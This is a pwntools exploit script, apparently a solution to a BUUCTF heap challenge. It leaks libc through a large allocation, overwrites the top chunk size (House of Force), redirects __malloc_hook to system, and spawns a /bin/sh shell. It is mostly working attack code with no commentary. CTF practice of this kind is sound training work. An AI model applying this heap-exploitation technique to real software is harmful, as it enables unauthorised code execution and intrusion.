from pwn import *
context(arch = 'amd64', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
#io = remote('node4.buuoj.cn', 25226)
elf = ELF("./pwn")
libc = elf.libc
#libc = ELF("/home/isidro/pwnh/buuctf/libc/u16-x64.so")

def debug():
	gdb.attach(io)
	pause()

sd   = lambda s    : io.send(s)
sda  = lambda s, n : io.sendafter(s, n)
sl   = lambda s    : io.sendline(s)
sla  = lambda s, n : io.sendlineafter(s, n)
rc   = lambda n    : io.recv(n)
rut  = lambda s    : io.recvuntil(s, drop=True)
ruf  = lambda s    : io.recvuntil(s, drop=False)
addr = lambda s    : u64(io.recvuntil(s, drop=True).ljust(8, b'\x00'))
byte = lambda n    : str(n).encode()
sh   = lambda      : io.interactive()

def add(size, content):
	sla(b'2:puts\n', b'1')
	sla(b'size\n', byte(size))
	rut(b'bin addr ')
	Addr = int(rut(b'\n'), 16)
	sda(b'content\n', content)
	return Addr	

libc.address = add(2097152, b'A\n') + 0x200ff0
print("libc_base : ", hex(libc.address))

one_gadget1 = libc.address + 0x45226
one_gadget2 = libc.address + 0x4527a
one_gadget3 = libc.address + 0xf03a4
one_gadget4 = libc.address + 0xf1247
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))
malloc_hook = libc.symbols['__malloc_hook']

payload = b'A'*0x10 + p64(0) + p64(0xFFFFFFFFFFFFFFFF)
heap_base = add(0x10, payload) - 0x10
print("heap_base : ", hex(heap_base))

old_top = heap_base + 0x20
offset = malloc_hook - old_top - 0x20
print("malloc_hook : ", hex(malloc_hook))
print("old_top : ", hex(old_top))

#debug()
add(offset,b'A\n')
add(0x10, p64(system))
sla(b'2:puts\n', b'1')
sla(b'size\n', byte(binsh))
#debug()
sh()
